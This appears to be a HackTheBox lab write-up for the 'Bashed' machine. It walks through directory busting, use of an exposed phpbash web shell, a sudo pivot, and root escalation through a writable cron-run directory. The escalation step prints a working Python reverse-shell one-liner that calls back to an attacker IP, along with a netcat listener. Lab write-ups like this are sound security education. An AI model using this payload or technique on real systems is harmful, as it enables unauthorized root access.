---
title: "HackTheBox: Bashed - Web Shell Discovery & Cron Privilege Escalation"
date: 2026-02-21
draft: false
description: "Walkthrough of HackTheBox Bashed, finding an exposed phpbash web shell and escalating to root via a Python cron job."
tags: ["hackthebox", "linux", "web", "cron", "privesc"]
---

## Introduction

Bashed is a Linux machine on HackTheBox that demonstrates the dangers of leaving development tools exposed on production servers. We'll discover an exposed web shell, then escalate privileges through sudo misconfigurations and a root cron job.

**Difficulty:** Easy  
**OS:** Linux   
**Skills:** Web enumeration, sudo abuse, cron job exploitation

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN nmap/bashed 10.129.2.11
```

Results:

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache 2.4.18 (Ubuntu) |

Only one port open - this is a web-focused box. The page title mentions "Arrexel's Development Site".

---

## Enumeration

### Directory Busting
```bash
gobuster dir -u http://10.129.2.11 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

Found directories:

| Directory | Status | Interest |
|-----------|--------|----------|
| /css | 301 | Low |
| /dev | 301 | **High** |
| /images | 301 | Low |
| /php | 301 | Medium |
| /uploads | 301 | Medium |

The `/dev` directory on a "Development Site" is very interesting.

---

## Initial Access

### Finding phpbash

Browsing to `/dev` reveals directory listing with two files:
- `phpbash.min.php`
- `phpbash.php`

This is [phpbash](https://github.com/Arrexel/phpbash) - a standalone PHP shell that the developer left exposed on the server.

### Web Shell Access

Clicking `phpbash.php` gives us an interactive web shell:
```bash
www-data@bashed:/var/www/html/dev# whoami
www-data
```

We have initial access as `www-data`.

---

## Privilege Escalation

### Checking Sudo Permissions
```bash
sudo -l
```

Output:
```bash
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

We can run any command as `scriptmanager` without a password.

### Exploring as scriptmanager
```bash
sudo -u scriptmanager find / -user scriptmanager 2>/dev/null
```

Found:
- `/scripts`
- `/scripts/test.py`
- `/home/scriptmanager`

### Analyzing /scripts Directory
```bash
sudo -u scriptmanager ls -la /scripts
```
```bash
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Feb 21 05:29 test.txt
```

**Key observation:** `test.py` is owned by `scriptmanager`, but `test.txt` is owned by **root** with a recent timestamp.

### Understanding the Vulnerability
```bash
sudo -u scriptmanager cat /scripts/test.py
```
```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

A cron job is running Python scripts in `/scripts` as root. Since we control `scriptmanager` and can write to this directory, we can create a malicious Python script that root will execute.

### Exploiting the Cron Job

Set up listener on Kali:
```bash
nc -lvnp 4445
```

Create malicious Python script:
```bash
sudo -u scriptmanager bash -c 'echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.65\",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])" > /scripts/root.py'
```

Wait for the cron job to execute (runs every minute), and we get a root shell:
```bash
root@bashed:/scripts# whoami
root
```

---

## Flags
```bash
cat /home/arrexel/user.txt
cat /root/root.txt
```

---

## Attack Path Summary
```bash
Port 80 (HTTP)
     │
     ▼
Directory Busting (/dev)
     │
     ▼
phpbash.php (Web Shell)
     │
     ▼
www-data shell
     │
     ▼
sudo -l (can run as scriptmanager)
     │
     ▼
/scripts directory (writable)
     │
     ▼
Cron runs Python as root
     │
     ▼
Malicious Python script
     │
     ▼
ROOT
```

---

## Key Takeaways

### What Went Wrong

| Issue | Impact |
|-------|--------|
| Development tool left on server | Direct shell access |
| Sudo misconfiguration | Lateral movement to scriptmanager |
| Root cron job in writable directory | Privilege escalation to root |

### Defensive Measures

| Recommendation | Priority |
|----------------|----------|
| Remove dev tools from production | Critical |
| Audit sudo permissions regularly | High |
| Never run cron jobs from user-writable directories | Critical |
| Use principle of least privilege | High |

---

## Lessons Learned

1. **Always enumerate web directories thoroughly** - `/dev` contained the entry point
2. **Check sudo -l immediately** - It's often the fastest path to escalation
3. **Look for cron jobs** - Files owned by root in user-writable directories indicate cron
4. **Development sites are gold mines** - Developers often leave tools and debug files exposed

---

## Tools Used

- Nmap
- Gobuster
- Netcat

---

*This writeup is for educational purposes. Only test on systems you have permission to access.*
